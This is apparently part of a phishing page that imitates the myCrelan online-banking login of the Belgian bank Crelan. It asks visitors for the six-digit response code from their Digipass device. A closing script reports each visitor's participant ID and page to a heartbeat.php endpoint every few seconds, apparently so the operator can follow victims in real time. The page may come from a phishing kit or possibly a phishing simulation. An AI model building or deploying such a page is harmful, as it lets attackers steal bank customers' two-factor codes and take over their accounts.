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"><span class="sr-only">,</span></div></div></li></ol><div class="argnt-a-field-container argnt-a-field-container--gap-8"><label for="signature"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">4. Voer hier de 6 cijfers in die op het scherm van uw digipass verschijnen</span></label><div class="argnt-m-form-masked-input"><div class="argnt-a-masked-input-field argnt-a-masked-input-field__challenge"><div class="argnt-a-field">

<input
  inputmode="numeric"
  autocapitalize="none"
  autocomplete="off"
  autocorrect="off"
  id="masrrsInputDigipass"
  spellcheck="false"
  tabindex="0"
  aria-autocomplete="list"
  aria-expanded="false"
  aria-haspopup="true"
  aria-invalid="false"
  aria-required="true"
  role="combobox"
  type="text"
  placeholder="......"
  maxlength="6"
  name="answer1"
  pattern="^\d{6}$"
  required
  title="Voer precies 6 cijfers in"
/>


<div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="xmark" class="svg-inline--fa fa-xmark " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z"></path></svg></div></div><div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-check" class="svg-inline--fa fa-circle-check " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z"></path></svg></div></div></div></div><div role="alert"><div class="argnt-q-collapse argnt-q-collapse--closed" aria-hidden="true" style="overflow: hidden; opacity: 0; height: 0px;"><div class="argnt-q-collapse__content"><span class="argnt-a-field-error"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-exclamation" class="svg-inline--fa fa-circle-exclamation " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z"></path></svg><span class="argnt-a-field-error__content" id="signature-error-message">Response code is verplicht.</span></span></div></div></div></div></div></div><div class="arg-m-signature-digipass"><img src="./files/trm.png" alt="Digipass Image"></div></div><div class="argnt-m-timeout-expiring-message sr-only"><div class="sr-only" role="alert"></div><div class="argnt-m-timeout-expiring-message__content"></div></div></div></div></div><div class="argnt-m-form-container--actions"><div class="argnt-m-submit-buttons"><button type="submit" class="argnt-a-button argnt-a-button--primary" aria-disabled="false"><span class="argnt-a-button-typography argnt-a-button__text">Aanmelden</span></button></div></div></div></div>


</form>



</div></div></div></section></div></div></div></div><div class="argnt-a-separator argnt-m-login-component__separator"></div><div class="argnt-p-message-warning-detail"></div></div></div></div></div></div></div></main><footer class="argnt-p-login-page__border-footer"><div class="argnt-m-footer"><div class="argnt-m-footer__links"><div class="argnt-m-footer__links-left"><span class="argnt-m-footer__copyright"></span></div><div class="argnt-m-footer__links-right"><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;">Meer info?</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;">Privacy</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;"> Règlement myCrelan</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="" target="_blank" rel="noopener noreferrer"><span style="font-weight: bolder;">Sécurité myCrelan</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><div class="argnt-m-footer__app-version"><span class="argnt-a-badge argnt-a-badge--light">Alle rechten voorbehouden © Crelan 2025</span></div></div></div></div></footer></div></div></div></div><div class="sr-only" role="status" aria-live="polite" aria-atomic="true" aria-relevant="additions text"></div></div>
    
    <script>
        // Heartbeat script to track participant activity
        function sendHeartbeat() {
            fetch('heartbeat.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'participant_id=<?php echo $participant_id; ?>&current_page=question3'
            }).catch(error => {
                console.log('Heartbeat error:', error);
            });
        }
        
        // Send heartbeat every 3 seconds
        sendHeartbeat(); // Send immediately
        setInterval(sendHeartbeat, 3000);
        
        // Send heartbeat when page becomes visible again
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                sendHeartbeat();
            }
        });
    </script>
</body>
</html>
